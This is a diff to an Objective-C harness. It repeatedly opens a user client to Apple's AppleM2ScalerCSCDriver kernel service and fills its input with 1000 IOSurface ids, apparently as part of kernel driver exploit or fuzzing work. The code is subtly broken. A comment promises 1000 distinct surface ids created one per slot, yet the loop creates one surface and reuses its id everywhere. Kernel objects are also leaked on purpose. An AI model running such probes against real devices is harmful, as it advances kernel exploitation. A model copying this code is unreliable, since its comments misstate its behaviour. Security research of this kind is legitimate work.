@@ -40,6 +40,10 @@ static void Lf(NSString *fmt, ...) {
 
 @implementation P172M2ContractSweep
 
+/* sync-review state: the v1.11 distinct bank + the created surfaces */
+static uint32_t bankSid = 0;
+static void *bankSrf[1000];
+static uint32_t bankCount = 0;
 + (NSString *)tap {
     NSMutableString *o = [NSMutableString string];
     NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
@@ -67,22 +71,24 @@ static void Lf(NSString *fmt, ...) {
     }
 
     CFMutableDictionaryRef md = matching("AppleM2ScalerCSCDriver");
-    io_obj_t svc = getsvc(mach_task_self(), md);
-    /* md deliberately never released (door-never-closes law) */
+    /* p114's 8x RE-LOOKUP law (2026-11-18 sync review): the service port
+       itself re-appears late on some boots — re-lookup inside the retry. */
     mach_port_t conn = 0;
     kern_return_t kr = 0xe00002eb;
-    /* M2Scaler IOServiceOpen FLAP law (p114 v1.5+): 0x10000003 lands on tap
-       #1 of some boots — the 19:52:25 receipt stopped exactly here on the
-       un-retried build. 3x bounded retry. */
-    for (int attempt = 1; attempt <= 3; attempt++) {
+    io_obj_t svc = MACH_PORT_NULL;
+    for (int attempt = 1; attempt <= 8; attempt++) {
+        if (md) CFRelease(md), md = NULL;
+        md = matching("AppleM2ScalerCSCDriver");
+        svc = getsvc(mach_task_self(), md);
         kr = open_(svc, mach_task_self(), 0, &conn);
-        Lf(@"[*] open try %d kr=0x%x conn=%d", attempt, kr, (int)(uintptr_t)conn);
+        Lf(@"[*] open try %d (re-lookup) kr=0x%x conn=%d", attempt, kr, (int)(uintptr_t)conn);
         if (kr == KERN_SUCCESS && conn) break;
         conn = 0;
-        usleep(200000);
+        usleep(250000);
     }
+    /* md never released: door-never-closes law; svc leaked by the getsvc consume */
     if (kr != KERN_SUCCESS || !conn) {
-        Lf(@"[-] open flapped through 3 attempts - honest stop");
+        Lf(@"[-] open flapped through 8 attempts - honest stop");
         if (g_fd >= 0) close(g_fd);
         return o;
     }
@@ -126,9 +132,18 @@ static void Lf(NSString *fmt, ...) {
         ((uint32_t *)in)[0] = 0x3E8;                      /* word0 = 1000 EXACT */
         for (uint32_t i = 0; i < 1000; i++) {
             uint32_t sid = 0;
-            if (variant == 1) sid = ids[i % 8];           /* distinct (repeats after 8: logged) */
-            if (variant == 2) sid = ids[0];               /* one good sid everywhere */
-            if (variant == 3) sid = 0;                    /* all-zero (expect 2c2) */
+            if (variant == 1) {
+                /* v1.11 law: 1000 DISTINCT live sids — create one per slot
+                   (16 KiB staging law), hold till after the sweep */
+                if (!bankSid && i < 1000 && bankCount < 1000) {
+                    void *srf = crSurf(sp);
+                    bankSid = srf ? surfId(srf) : 0;
+                    if (srf && bankSid) { bankSrf[bankCount++] = srf; }
+                }
+                sid = bankSid;
+            }
+            if (variant == 2) sid = bankSid;
+            if (variant == 3) sid = 0;
             ((uint32_t *)(in + 4))[i] = sid;
         }
         /* v7 (24B156 bridge decode): flags bit0 = 1 mandatory, AND the IOSA
